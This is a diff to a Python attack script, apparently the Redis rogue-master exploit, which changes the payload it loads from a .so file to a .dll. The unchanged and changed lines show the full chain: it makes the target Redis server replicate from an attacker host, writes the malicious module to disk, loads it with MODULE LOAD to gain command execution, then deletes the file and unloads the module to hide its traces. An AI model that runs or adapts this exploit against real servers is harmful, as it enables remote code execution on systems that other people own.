@@ -4,7 +4,7 @@ import sys
 from time import sleep
 from optparse import OptionParser
 
-payload = open("exp.so", "rb").read()
+payload = open("exp.dll", "rb").read()
 CLRF = "\r\n"
 
 def mk_cmd_arr(arr):
@@ -115,12 +115,12 @@ def runserver(rhost, rport, lhost, lport):
     # expolit
     remote = Remote(rhost, rport)
     remote.do(f"SLAVEOF {lhost} {lport}")
-    remote.do("CONFIG SET dbfilename exp.so")
+    remote.do("CONFIG SET dbfilename exp.dll")
     sleep(2)
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
-    remote.do("MODULE LOAD ./exp.so")
+    remote.do("MODULE LOAD ./exp.dll")
     remote.do("SLAVEOF NO ONE")
 
     # Operations here
@@ -128,7 +128,7 @@ def runserver(rhost, rport, lhost, lport):
 
     # clean up
     remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm ./exp.so")
+    remote.shell_cmd("rm ./exp.dll")
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
